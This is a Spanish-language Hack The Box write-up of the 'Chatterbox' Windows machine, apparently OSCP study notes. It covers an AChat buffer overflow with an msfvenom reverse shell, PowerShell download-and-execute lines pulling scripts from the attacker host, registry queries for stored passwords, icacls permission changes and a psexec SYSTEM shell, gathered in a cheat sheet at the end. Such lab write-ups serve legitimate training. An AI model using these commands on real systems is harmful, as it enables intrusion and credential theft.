[💬 Chatterbox — HTB [Windows · Medium] 33215bd2d16c81018583d487c75a640d.md](https://github.com/user-attachments/files/28279542/Chatterbox.HTB.Windows.Medium.33215bd2d16c81018583d487c75a640d.md)
# 💬 Chatterbox — HTB [Windows · Medium]

> **Plataforma:** Hack The Box | **OS:** Windows 7 x86 | **Dificultad:** Medium | **CVE:** CVE-2015-1578 (AChat Buffer Overflow) + Registry Credential Hunting
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.129.12.23` |
| Foothold | AChat UDP Buffer Overflow — encoding `x86/unicode_mixed` |
| Acceso inicial | Shell como **alfred** (usuario bajo privilegio) |
| PrivEsc | Credenciales en texto claro en el registro de Windows (Winlogon) |
| Acceso final | **NT AUTHORITYSYSTEM** vía impacket-psexec |
| No usado | Kernel exploits (inestables) / Sherlock (colgaba la shell) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN chatterbox_full.nmap 10.129.12.23
```

```
PORT      STATE SERVICE VERSION
9255/tcp  open  http    AChat chat system httpd
9256/tcp  open  achat   AChat chat system
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
```

**Dato clave:** AChat corriendo en puertos 9255/9256. Software de chat obsoleto y sin mantenimiento — candidato inmediato a vulnerabilidades de Buffer Overflow.

```bash
searchsploit achat
# → 36025.py — AChat 0.150 beta7 - Remote Buffer Overflow
```

---

# 2. Foothold — AChat Buffer Overflow (CVE-2015-1578)

## ¿Qué es la vulnerabilidad?

AChat 0.150 beta7 tiene un fallo en el manejo de paquetes UDP. Al enviar un paquete especialmente manipulado con una cadena demasiado larga, se desborda el buffer del stack y se puede redirigir la ejecución al shellcode controlado por el atacante.

## Por qué el shellcode necesita encoding unicode_mixed

El protocolo de chat de AChat procesa los mensajes como cadenas de texto con codificación Unicode. Los bytes que no son caracteres Unicode válidos son filtrados o alterados antes de llegar al buffer vulnerable — exactamente el mismo problema que con WebDAV en Grandpa pero con Unicode en lugar de ASCII.

El encoder `x86/unicode_mixed` con `BufferRegister=EAX` genera shellcode que:

- Usa solo caracteres Unicode válidos (sobrevive al filtro del protocolo)
- Usa el registro EAX como base para calcular direcciones relativas del shellcode
- Es compatible con la arquitectura x86 del servidor AChat

```bash
# Generar shellcode compatible con AChat
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -e x86/unicode_mixed \
  BufferRegister=EAX \
  -f python
```

## Modificar y ejecutar el exploit

```bash
searchsploit -m 36025.py
nano 36025.py
```

Cambios necesarios en el script:

- Reemplazar el shellcode por defecto con el generado por msfvenom
- Cambiar la IP target: `server_address = ('10.129.12.23', 9256)`

```bash
# Listener
nc -lvnp 4444

# Ejecutar
python 36025.py
```

## Shell recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.129.12.23]
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
chatterbox\alfred
```

---

# 3. Enumeración Post-Foothold

## OS y arquitectura

```bash
systeminfo
```

```
OS Name:    Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
System Type: X86-based PC
```

Windows 7 SP1 Build 7601 x86.

## Privilegios del usuario

```bash
whoami /priv
```

SeImpersonatePrivilege disponible — JuicyPotato sería una alternativa. Sin embargo la ruta del registro resultó más limpia.

## Intentos de PrivEsc con herramientas — por qué fallaron

### [Sherlock.ps](http://Sherlock.ps)1 — colgaba la shell

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/Sherlock.ps1')
```

**Síntoma:** La shell se quedaba sin respuesta, sin output, congelada.

**Causa:** [Sherlock.ps](http://Sherlock.ps)1 usa `Get-WmiObject` y otras llamadas que requieren una shell interactiva con contexto de usuario completo. La shell de Netcat no proporciona ese contexto — es una shell no interactiva que no puede gestionar correctamente las llamadas WMI. El script se cuelga esperando input o contexto que nunca llega.

**Lección:** Si un script de PS se cuelga en Netcat, usar `powershell -c "script"` en lugar de abrir el modo interactivo, o pasar a enumeración manual.

### Watson.exe — build no soportada

```
Watson.exe
# → "[-] OS Build number: 7601"
# → "[-] Could not find any CVEs"
```

**Causa:** Watson no soporta builds legacy como 7601 (Windows 7 SP1). Está diseñado para Windows 10 y versiones modernas de Server. La Build 7601 es demasiado antigua para su base de datos.

**Lección:** Conocer qué herramienta aplica a qué build de Windows. Para Win7/2008 → Sherlock o enumeración manual. Para Win10/2016+ → Watson.

| Build | OS | Herramienta recomendada |
| --- | --- | --- |
| 7600/7601 | Windows 7 / Server 2008 R2 | [Sherlock.ps](http://Sherlock.ps)1 |
| 9200 | Windows 8 / Server 2012 | [Sherlock.ps](http://Sherlock.ps)1 |
| 10240+ | Windows 10 / Server 2016+ | Watson.exe |

---

# 4. El Hallazgo Ganador — Registry Credential Hunting 🏆

## Por qué mirar el registro de Winlogon

Cuando Windows tiene habilitado el **AutoAdminLogon**, las credenciales del usuario que se loguea automáticamente se guardan en el registro en texto claro. Esta es una mala práctica de configuración común en entornos corporativos o máquinas de laboratorio donde el administrador configura el inicio automático de sesión por comodidad.

El registro a consultar siempre:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## Output del comando — el jackpot

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoAdminLogon    REG_SZ    1
    DefaultUserName   REG_SZ    Alfred
    DefaultPassword   REG_SZ    Welcome1!
```

**AutoAdminLogon = 1** confirma que el sistema tiene login automático configurado. **DefaultPassword** contiene la contraseña en texto claro: `Welcome1!`

## Otros registros a revisar siempre para credential hunting

```bash
:: Contraseñas guardadas en configuraciones de autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword

:: VNC passwords (cifradas pero crackeables)
reg query "HKCU\Software\ORL\WinVNC3\Password"

:: Putty stored sessions con credenciales
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

:: SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

---

# 5. Escalada de Privilegios — Reutilización de Credenciales

## Hipótesis: ¿usa Administrator la misma contraseña?

En entornos reales, los administradores reciclan contraseñas entre su cuenta de usuario y la de Administrator. `Welcome1!` era la contraseña de Alfred — probar si también es la de Administrator es el paso lógico.

## Técnica icacls — Pro move antes de perder la shell

Antes de intentar la escalada, asegurarse el acceso a las flags modificando los permisos directamente desde la shell actual:

```bash
:: Darse permisos de lectura sobre los archivos de flags
icacls C:\Users\Alfred\Desktop\user.txt /grant alfred:F
icacls C:\Users\Administrator\Desktop\root.txt /grant alfred:F

:: Luego leer directamente
type C:\Users\Alfred\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

> **Por qué icacls es un pro move:** En shells inestables o con AV activo, si la shell se cae después de la escalada, puedes perder el acceso antes de leer las flags. Modificar los permisos desde la shell actual de alfred garantiza que puedes leer el root.txt aunque no consigas SYSTEM shell interactiva. En el OSCP la flag es el objetivo — no la shell.
> 

## impacket-psexec para shell de SYSTEM

```bash
impacket-psexec 'administrator:Welcome1!@10.129.12.23'
```

> **Por qué comillas simples `' '`:** En bash, el símbolo `!` dentro de comillas dobles `" "` es interpretado como expansión de historial (`!` = último comando). Esto rompe el comando y da error de conexión. Las comillas simples le dicen a bash que trate todo literalmente, sin interpretar caracteres especiales. Regla: cuando una contraseña o argumento contiene `!`, `$`, o `\`, usar siempre comillas simples.
> 

## Shell SYSTEM recibida

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.12.23.....
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Opening SVCManager on 10.129.12.23.....
[*] Creating service ...
[*] Starting service ...

Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> whoami
nt authority\system
```

---

# 6. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Shellcode binario puro en AChat | Shell no conecta | AChat filtra bytes no-Unicode → usar `x86/unicode_mixed`  • `BufferRegister=EAX` |
| 2 | [Sherlock.ps](http://Sherlock.ps)1 en shell Netcat | Shell congelada sin output | Netcat es no interactiva → WMI calls se cuelgan sin contexto de usuario |
| 3 | Watson.exe en Win7 Build 7601 | `Could not find any CVEs` | Watson no soporta builds legacy → usar Sherlock para Win7/2008 |
| 4 | Kernel exploits directos | Shells inestables o colgadas | Entorno hostil → pivotar a credential hunting en registro |
| 5 | impacket-psexec con comillas dobles | Error de conexión / bash interpreta `!` | `!` en contraseña dentro de `""` = expansión de historial → usar `' '` |
| ✅ | Winlogon registry + icacls + psexec | **SYSTEM shell** | Credential hunting en registro → reutilización → acceso directo |

---

# 7. Rutas Alternativas de PrivEsc

Si el registro no hubiera tenido credenciales, estas alternativas estaban disponibles:

| Método | Por qué funcionaría |
| --- | --- |
| **JuicyPotato** | alfred tiene SeImpersonatePrivilege en Win7 |
| **MS16-032** | Windows 7 SP1 vulnerable, vía IEX en memoria |
| **MS11-046** | Clásico para Win7/2008 R2, muy estable en x86 |

Para cualquiera de estos, ejecutar vía SMB si hay AV activo:

```bash
\\10.10.14.X\shared\exploit.exe [args]
```

---

# 8. Moralejas y Notas para el OSCP

## Moraleja 1 — El registro de Windows es una mina de credenciales

Chatterbox demuestra que no siempre necesitas un exploit de kernel para escalar privilegios. Una mala configuración de administrador — AutoAdminLogon con contraseña en texto claro — da SYSTEM sin vulnerar ningún CVE.

El registro a revisar en **cada máquina Windows** tras el foothold:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

Si ves `AutoAdminLogon = 1`, la contraseña casi siempre está en `DefaultPassword`.

---

## Moraleja 2 — El encoding del shellcode depende del protocolo que lo transporta

Cada protocolo tiene sus restricciones de caracteres:

- **WebDAV / HTTP URL:** → `x86/alpha_mixed` (solo alfanumérico)
- **AChat / Unicode:** → `x86/unicode_mixed` con `BufferRegister=EAX`
- **SMB / ejecución directa:** → shellcode estándar sin encoder

Antes de generar un payload para un exploit, entender qué filtra el protocolo. Un shellcode que no sobrevive el transporte llega corrupto y el exploit falla silenciosamente.

---

## Moraleja 3 — Si un script se cuelga en Netcat, no es el script, es el contexto

Netcat proporciona una shell no interactiva. Herramientas como Sherlock que usan WMI, COM o llamadas que requieren un contexto de usuario completo se cuelgan porque ese contexto no existe en Netcat.

Soluciones:

```bash
:: En lugar de abrir PS interactivo:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/Sherlock.ps1')"

:: O forzar ejecución no interactiva con -NonInteractive
powershell -NonInteractive -ep bypass -c "..."
```

---

## Moraleja 4 — icacls: asegurar las flags antes de intentar la escalada

En el OSCP el objetivo es la flag, no la shell interactiva. Si tienes una shell como usuario bajo privilegio y el archivo de root está fuera de tu alcance, modificar los ACLs directamente es completamente válido:

```bash
icacls C:\Users\Administrator\Desktop\root.txt /grant TU_USUARIO:F
type C:\Users\Administrator\Desktop\root.txt
```

Esto funciona siempre que el proceso tenga permisos para modificar ACLs — y los servicios de Windows frecuentemente los tienen. Es más rápido, más estable y menos ruidoso que un exploit de kernel.

---

## Moraleja 5 — Comillas simples para contraseñas con caracteres especiales en bash

Regla fija: cualquier contraseña o argumento que contenga `!`, `$`,    `o` ` debe ir entre comillas simples en bash:

```bash
# MAL — bash interpreta ! como historial
impacket-psexec "administrator:Welcome1!@10.129.12.23"

# BIEN — comillas simples: bash no interpreta nada
impacket-psexec 'administrator:Welcome1!@10.129.12.23'
```

Este error es exactamente el tipo de cosa que hace perder 20 minutos en el OSCP pensando que las credenciales son incorrectas cuando en realidad el problema es el shell de bash.

---

## Moraleja 6 — El patrón completo de Chatterbox

```
nmap → AChat 9255/9256
    ↓
msfvenom x86/unicode_mixed BufferRegister=EAX → shellcode para AChat
    ↓
python 36025.py → shell como alfred
    ↓
Sherlock cuelga / Watson no soporta build → pivotar a credential hunting
    ↓
reg query Winlogon → DefaultPassword = Welcome1!
    ↓
icacls → asegurar lectura de flags
    ↓
impacket-psexec 'administrator:Welcome1!@IP' → SYSTEM
```

---

# 9. Comandos Clave — Cheat Sheet

```bash
# Generar shellcode Unicode para AChat
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 \
  -e x86/unicode_mixed BufferRegister=EAX -f python

# Listener + exploit
nc -lvnp 4444
python 36025.py

# Post-foothold
whoami /priv
systeminfo

# Credential hunting en registro
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# icacls — asegurar flags antes de escalar
icacls C:\Users\Administrator\Desktop\root.txt /grant alfred:F

# PowerShell no interactivo (evita que se cuelgue en Netcat)
powershell -ep bypass -NonInteractive -c "IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/Sherlock.ps1')"

# SYSTEM via psexec (comillas simples para !) 
impacket-psexec 'administrator:Welcome1!@10.129.12.23'

# Flags
type C:\Users\alfred\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

# 10. Flags

> Las capturas de las flags están documentadas a continuación como evidencia de la intrusión completa.
>
